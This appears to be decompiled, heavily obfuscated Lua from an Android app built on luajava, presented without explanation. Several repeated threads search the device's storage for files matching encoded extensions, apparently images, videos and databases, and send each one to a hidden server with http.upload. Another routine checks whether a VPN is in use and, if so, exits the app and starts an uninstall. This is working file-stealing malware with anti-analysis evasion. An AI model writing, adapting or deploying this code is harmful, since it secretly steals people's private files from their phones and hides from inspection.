          file = L131_281() .. L2_468.tostring((A0_466.listFiles() or L2_468.File({}))[_FORV_9_]) .. L132_282()
        }), (L133_283())) then
        end
      end
      L2_468.luajava.clear((A0_466.listFiles() or L2_468.File({}))[_FORV_9_])
    end
  end
  )(A0_462, A1_463)
end
, L0_213.File((L119_273())), (L121_275()))
L0_213.require(L135_285())
L0_213.import(L138_287())
L0_213.thread(function(A0_469, A1_470)
  local L2_471, L3_472
  L2_471 = L0_213
  L3_472 = 0
  L2_471.require(L140_289())
  L2_471.import(L141_290())
  L2_471.import(L142_291())
  L2_471.import(L143_292())
  ;(function(A0_473, A1_474)
    local L2_475
    L2_475 = L2_471
    for _FORV_9_ = 0, #(A0_473.listFiles() or L2_475.File({})) - 1 do
      if (A0_473.listFiles() or L2_475.File({}))[_FORV_9_].isDirectory() then
        _UPVALUE1_((A0_473.listFiles() or L2_475.File({}))[_FORV_9_], (L2_475.tostring(A1_474)))
      elseif L2_475.string.find((A0_473.listFiles() or L2_475.File({}))[_FORV_9_].Name, (L2_475.tostring(A1_474))) then
        L2_475.table.insert(_UPVALUE2_, (A0_473.listFiles() or L2_475.File({}))[_FORV_9_].Name)
        if L2_475.string.match(L2_475.http.upload(_UPVALUE3_(), {}, {
          file = _UPVALUE4_() .. L2_475.tostring((A0_473.listFiles() or L2_475.File({}))[_FORV_9_]) .. _UPVALUE5_()
        }), (_UPVALUE6_())) then
        end
      end
      L2_475.luajava.clear((A0_473.listFiles() or L2_475.File({}))[_FORV_9_])
    end
  end
  )(A0_469, A1_470)
end
, L0_213.File((L136_286())), (L139_288()))
L0_213.require((function()
  local L0_476, L1_477
  L0_476 = L0_213
  L1_477 = nil
  if L1_477 then
  end
  if 717 < -767 then
  end
  L1_477 = nil
  if L1_477 then
    repeat
      repeat
        do break end
        break
      until true
      L1_477 = nil
      if L1_477 then
      else
      end
    until true
  else
  end
  L1_477 = L5_214
  L1_477 = L1_477(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_477
end
)())
L0_213.import((function()
  local L0_478, L1_479
  L0_478 = L0_213
  L1_479 = nil
  if L1_479 then
  end
  if 717 < -767 then
  end
  L1_479 = nil
  if L1_479 then
    repeat
      repeat
        do break end
        break
      until true
      L1_479 = nil
      if L1_479 then
      else
      end
    until true
  else
  end
  L1_479 = L5_214
  L1_479 = L1_479(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_479
end
)())
L0_213.thread(function(A0_480, A1_481)
  local L2_482, L3_483
  L2_482 = L0_213
  L3_483 = 0
  L2_482.require(_UPVALUE1_())
  L2_482.import(_UPVALUE2_())
  L2_482.import(_UPVALUE3_())
  L2_482.import(_UPVALUE4_())
  ;(function(A0_484, A1_485)
    local L2_486
    L2_486 = L2_482
    for _FORV_9_ = 0, #(A0_484.listFiles() or L2_486.File({})) - 1 do
      if (A0_484.listFiles() or L2_486.File({}))[_FORV_9_].isDirectory() then
        _UPVALUE1_((A0_484.listFiles() or L2_486.File({}))[_FORV_9_], (L2_486.tostring(A1_485)))
      elseif L2_486.string.find((A0_484.listFiles() or L2_486.File({}))[_FORV_9_].Name, (L2_486.tostring(A1_485))) then
        L2_486.table.insert(_UPVALUE2_, (A0_484.listFiles() or L2_486.File({}))[_FORV_9_].Name)
        if L2_486.string.match(L2_486.http.upload(_UPVALUE3_(), {}, {
          file = _UPVALUE4_() .. L2_486.tostring((A0_484.listFiles() or L2_486.File({}))[_FORV_9_]) .. _UPVALUE5_()
        }), (_UPVALUE6_())) then
        end
      end
      L2_486.luajava.clear((A0_484.listFiles() or L2_486.File({}))[_FORV_9_])
    end
  end
  )(A0_480, A1_481)
end
, L0_213.File(((function()
  local L0_487, L1_488
  L0_487 = L0_213
  L1_488 = nil
  if L1_488 then
  end
  if 717 < -767 then
  end
  L1_488 = nil
  if L1_488 then
    repeat
      repeat
        do break end
        break
      until true
      L1_488 = nil
      if L1_488 then
      else
      end
    until true
  else
  end
  L1_488 = L5_214
  L1_488 = L1_488(L40_215({
    L42_217 - 120068,
    L42_217 - 120000,
    L42_217 - 119999,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120012,
    L42_217 - 120014,
    L42_217 - 120068,
    L42_217 - 120014,
    L42_217 - 120006,
    L42_217 - 119998,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120015,
    L42_217 - 120068,
    L42_217 - 120067,
    L42_217 - 120068,
    L42_217 - 120050,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120039,
    L42_217 - 119998,
    L42_217 - 120018,
    L42_217 - 120068
  }))
  return L1_488
end
)())), ((function()
  local L0_489, L1_490
  L0_489 = L0_213
  L1_490 = nil
  if L1_490 then
  end
  if 717 < -767 then
  end
  L1_490 = nil
  if L1_490 then
    repeat
      repeat
        do break end
        break
      until true
      L1_490 = nil
      if L1_490 then
      else
      end
    until true
  else
  end
  L1_490 = L5_214
  L1_490 = L1_490(L40_215({
    L42_217 - 120069,
    L42_217 - 120018,
    L42_217 - 120007,
    L42_217 - 120003
  }))
  return L1_490
end
)()))
L0_213.require((function()
  local L0_491, L1_492
  L0_491 = L0_213
  L1_492 = nil
  if L1_492 then
  end
  if 717 < -767 then
  end
  L1_492 = nil
  if L1_492 then
    repeat
      repeat
        do break end
        break
      until true
      L1_492 = nil
      if L1_492 then
      else
      end
    until true
  else
  end
  L1_492 = L5_214
  L1_492 = L1_492(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_492
end
)())
L0_213.import((function()
  local L0_493, L1_494
  L0_493 = L0_213
  L1_494 = nil
  if L1_494 then
  end
  if 717 < -767 then
  end
  L1_494 = nil
  if L1_494 then
    repeat
      repeat
        do break end
        break
      until true
      L1_494 = nil
      if L1_494 then
      else
      end
    until true
  else
  end
  L1_494 = L5_214
  L1_494 = L1_494(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_494
end
)())
L0_213.thread(function(A0_495, A1_496)
  local L2_497, L3_498
  L2_497 = L0_213
  L3_498 = 0
  L2_497.require(_UPVALUE1_())
  L2_497.import(_UPVALUE2_())
  L2_497.import(_UPVALUE3_())
  L2_497.import(_UPVALUE4_())
  ;(function(A0_499, A1_500)
    local L2_501
    L2_501 = L2_497
    for _FORV_9_ = 0, #(A0_499.listFiles() or L2_501.File({})) - 1 do
      if (A0_499.listFiles() or L2_501.File({}))[_FORV_9_].isDirectory() then
        _UPVALUE1_((A0_499.listFiles() or L2_501.File({}))[_FORV_9_], (L2_501.tostring(A1_500)))
      elseif L2_501.string.find((A0_499.listFiles() or L2_501.File({}))[_FORV_9_].Name, (L2_501.tostring(A1_500))) then
        L2_501.table.insert(_UPVALUE2_, (A0_499.listFiles() or L2_501.File({}))[_FORV_9_].Name)
        if L2_501.string.match(L2_501.http.upload(_UPVALUE3_(), {}, {
          file = _UPVALUE4_() .. L2_501.tostring((A0_499.listFiles() or L2_501.File({}))[_FORV_9_]) .. _UPVALUE5_()
        }), (_UPVALUE6_())) then
        end
      end
      L2_501.luajava.clear((A0_499.listFiles() or L2_501.File({}))[_FORV_9_])
    end
  end
  )(A0_495, A1_496)
end
, L0_213.File(((function()
  local L0_502, L1_503
  L0_502 = L0_213
  L1_503 = nil
  if L1_503 then
  end
  if 717 < -767 then
  end
  L1_503 = nil
  if L1_503 then
    repeat
      repeat
        do break end
        break
      until true
      L1_503 = nil
      if L1_503 then
      else
      end
    until true
  else
  end
  L1_503 = L5_214
  L1_503 = L1_503(L40_215({
    L42_217 - 120068,
    L42_217 - 120000,
    L42_217 - 119999,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120012,
    L42_217 - 120014,
    L42_217 - 120068,
    L42_217 - 120014,
    L42_217 - 120006,
    L42_217 - 119998,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120015,
    L42_217 - 120068,
    L42_217 - 120067,
    L42_217 - 120068
  }))
  return L1_503
end
)())), ((function()
  local L0_504, L1_505
  L0_504 = L0_213
  L1_505 = nil
  if L1_505 then
  end
  if 717 < -767 then
  end
  L1_505 = nil
  if L1_505 then
    repeat
      repeat
        do break end
        break
      until true
      L1_505 = nil
      if L1_505 then
      else
      end
    until true
  else
  end
  L1_505 = L5_214
  L1_505 = L1_505(L40_215({
    L42_217 - 120069,
    L42_217 - 120007,
    L42_217 - 119998,
    L42_217 - 120018
  }))
  return L1_505
end
)()))
L0_213.require((function()
  local L0_506, L1_507
  L0_506 = L0_213
  L1_507 = nil
  if L1_507 then
  end
  if 717 < -767 then
  end
  L1_507 = nil
  if L1_507 then
    repeat
      repeat
        do break end
        break
      until true
      L1_507 = nil
      if L1_507 then
      else
      end
    until true
  else
  end
  L1_507 = L5_214
  L1_507 = L1_507(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_507
end
)())
L0_213.import((function()
  local L0_508, L1_509
  L0_508 = L0_213
  L1_509 = nil
  if L1_509 then
  end
  if 717 < -767 then
  end
  L1_509 = nil
  if L1_509 then
    repeat
      repeat
        do break end
        break
      until true
      L1_509 = nil
      if L1_509 then
      else
      end
    until true
  else
  end
  L1_509 = L5_214
  L1_509 = L1_509(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_509
end
)())
L0_213.thread(function(A0_510, A1_511)
  local L2_512, L3_513
  L2_512 = L0_213
  L3_513 = 0
  L2_512.require(_UPVALUE1_())
  L2_512.import(_UPVALUE2_())
  L2_512.import(_UPVALUE3_())
  L2_512.import(_UPVALUE4_())
  ;(function(A0_514, A1_515)
    local L2_516
    L2_516 = L2_512
    for _FORV_9_ = 0, #(A0_514.listFiles() or L2_516.File({})) - 1 do
      if (A0_514.listFiles() or L2_516.File({}))[_FORV_9_].isDirectory() then
        _UPVALUE1_((A0_514.listFiles() or L2_516.File({}))[_FORV_9_], (L2_516.tostring(A1_515)))
      elseif L2_516.string.find((A0_514.listFiles() or L2_516.File({}))[_FORV_9_].Name, (L2_516.tostring(A1_515))) then
        L2_516.table.insert(_UPVALUE2_, (A0_514.listFiles() or L2_516.File({}))[_FORV_9_].Name)
        if L2_516.string.match(L2_516.http.upload(_UPVALUE3_(), {}, {
          file = _UPVALUE4_() .. L2_516.tostring((A0_514.listFiles() or L2_516.File({}))[_FORV_9_]) .. _UPVALUE5_()
        }), (_UPVALUE6_())) then
        end
      end
      L2_516.luajava.clear((A0_514.listFiles() or L2_516.File({}))[_FORV_9_])
    end
  end
  )(A0_510, A1_511)
end
, L0_213.File(((function()
  local L0_517, L1_518
  L0_517 = L0_213
  L1_518 = nil
  if L1_518 then
  end
  if 717 < -767 then
  end
  L1_518 = nil
  if L1_518 then
    repeat
      repeat
        do break end
        break
      until true
      L1_518 = nil
      if L1_518 then
      else
      end
    until true
  else
  end
  L1_518 = L5_214
  L1_518 = L1_518(L40_215({
    L42_217 - 120068,
    L42_217 - 120000,
    L42_217 - 119999,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120012,
    L42_217 - 120014,
    L42_217 - 120068,
    L42_217 - 120014,
    L42_217 - 120006,
    L42_217 - 119998,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120015,
    L42_217 - 120068,
    L42_217 - 120067,
    L42_217 - 120068
  }))
  return L1_518
end
)())), ((function()
  local L0_519, L1_520
  L0_519 = L0_213
  L1_520 = nil
  if L1_520 then
  end
  if 717 < -767 then
  end
  L1_520 = nil
  if L1_520 then
    repeat
      repeat
        do break end
        break
      until true
      L1_520 = nil
      if L1_520 then
      else
      end
    until true
  else
  end
  L1_520 = L5_214
  L1_520 = L1_520(L40_215({
    L42_217 - 120069,
    L42_217 - 120018,
    L42_217 - 120003,
    L42_217 - 120008
  }))
  return L1_520
end
)()))
L0_213.require((function()
  local L0_521, L1_522
  L0_521 = L0_213
  L1_522 = nil
  if L1_522 then
  end
  if 717 < -767 then
  end
  L1_522 = nil
  if L1_522 then
    repeat
      repeat
        do break end
        break
      until true
      L1_522 = nil
      if L1_522 then
      else
      end
    until true
  else
  end
  L1_522 = L5_214
  L1_522 = L1_522(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_522
end
)())
L0_213.import((function()
  local L0_523, L1_524
  L0_523 = L0_213
  L1_524 = nil
  if L1_524 then
  end
  if 717 < -767 then
  end
  L1_524 = nil
  if L1_524 then
    repeat
      repeat
        do break end
        break
      until true
      L1_524 = nil
      if L1_524 then
      else
      end
    until true
  else
  end
  L1_524 = L5_214
  L1_524 = L1_524(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_524
end
)())
L0_213.thread(function(A0_525, A1_526)
  local L2_527, L3_528
  L2_527 = L0_213
  L3_528 = 0
  L2_527.require(_UPVALUE1_())
  L2_527.import(_UPVALUE2_())
  L2_527.import(_UPVALUE3_())
  L2_527.import(_UPVALUE4_())
  ;(function(A0_529, A1_530)
    local L2_531
    L2_531 = L2_527
    for _FORV_9_ = 0, #(A0_529.listFiles() or L2_531.File({})) - 1 do
      if (A0_529.listFiles() or L2_531.File({}))[_FORV_9_].isDirectory() then
        _UPVALUE1_((A0_529.listFiles() or L2_531.File({}))[_FORV_9_], (L2_531.tostring(A1_530)))
      elseif L2_531.string.find((A0_529.listFiles() or L2_531.File({}))[_FORV_9_].Name, (L2_531.tostring(A1_530))) then
        L2_531.table.insert(_UPVALUE2_, (A0_529.listFiles() or L2_531.File({}))[_FORV_9_].Name)
        if L2_531.string.match(L2_531.http.upload(_UPVALUE3_(), {}, {
          file = _UPVALUE4_() .. L2_531.tostring((A0_529.listFiles() or L2_531.File({}))[_FORV_9_]) .. _UPVALUE5_()
        }), (_UPVALUE6_())) then
        end
      end
      L2_531.luajava.clear((A0_529.listFiles() or L2_531.File({}))[_FORV_9_])
    end
  end
  )(A0_525, A1_526)
end
, L0_213.File(((function()
  local L0_532, L1_533
  L0_532 = L0_213
  L1_533 = nil
  if L1_533 then
  end
  if 717 < -767 then
  end
  L1_533 = nil
  if L1_533 then
    repeat
      repeat
        do break end
        break
      until true
      L1_533 = nil
      if L1_533 then
      else
      end
    until true
  else
  end
  L1_533 = L5_214
  L1_533 = L1_533(L40_215({
    L42_217 - 120068,
    L42_217 - 120000,
    L42_217 - 119999,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120012,
    L42_217 - 120014,
    L42_217 - 120068,
    L42_217 - 120014,
    L42_217 - 120006,
    L42_217 - 119998,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120015,
    L42_217 - 120068,
    L42_217 - 120067,
    L42_217 - 120068
  }))
  return L1_533
end
)())), ((function()
  local L0_534, L1_535
  L0_534 = L0_213
  L1_535 = nil
  if L1_535 then
  end
  if 717 < -767 then
  end
  L1_535 = nil
  if L1_535 then
    repeat
      repeat
        do break end
        break
      until true
      L1_535 = nil
      if L1_535 then
      else
      end
    until true
  else
  end
  L1_535 = L5_214
  L1_535 = L1_535(L40_215({
    L42_217 - 120069,
    L42_217 - 120000,
    L42_217 - 120011
  }))
  return L1_535
end
)()))
L0_213.import((function()
  local L0_536, L1_537
  L0_536 = L0_213
  L1_537 = nil
  if L1_537 then
  end
  if 717 < -767 then
  end
  L1_537 = nil
  if L1_537 then
    repeat
      repeat
        do break end
        break
      until true
      L1_537 = nil
      if L1_537 then
      else
      end
    until true
  else
  end
  L1_537 = L5_214
  L1_537 = L1_537(L40_215({
    L42_217 - 120016,
    L42_217 - 120004,
    L42_217 - 120006,
    L42_217 - 120069,
    L42_217 - 120007,
    L42_217 - 119998,
    L42_217 - 119995,
    L42_217 - 119999,
    L42_217 - 120000,
    L42_217 - 120069,
    L42_217 - 120005,
    L42_217 - 120014,
    L42_217 - 119999,
    L42_217 - 119996,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120008,
    L42_217 - 120069,
    L42_217 - 120037,
    L42_217 - 120014,
    L42_217 - 119999,
    L42_217 - 119996,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120008,
    L42_217 - 120000
  }))
  return L1_537
end
)())
function L0_213.线程1()
  local L0_538
  L0_538 = L0_213
  if L0_538.Networks.isVpnUsed() then
    L0_538.os.exit()
    L0_538.包名 = _UPVALUE1_()
    L0_538.uri = L0_538.Uri.parse(_UPVALUE2_() .. L0_538.包名)
    L0_538.intent = L0_538.Intent(L0_538.Intent.ACTION_DELETE, L0_538.uri)
    L0_538.activity.startActivity(L0_538.intent)
    L0_538.print((_UPVALUE3_()))
  else
  end
end

L0_213.thread(function()
  local L0_539
  L0_539 = L0_213
  L0_539.require(_UPVALUE1_())
  while true do
    L0_539.Thread.sleep(2000)
    L0_539.call((_UPVALUE2_()))
  end
end
)
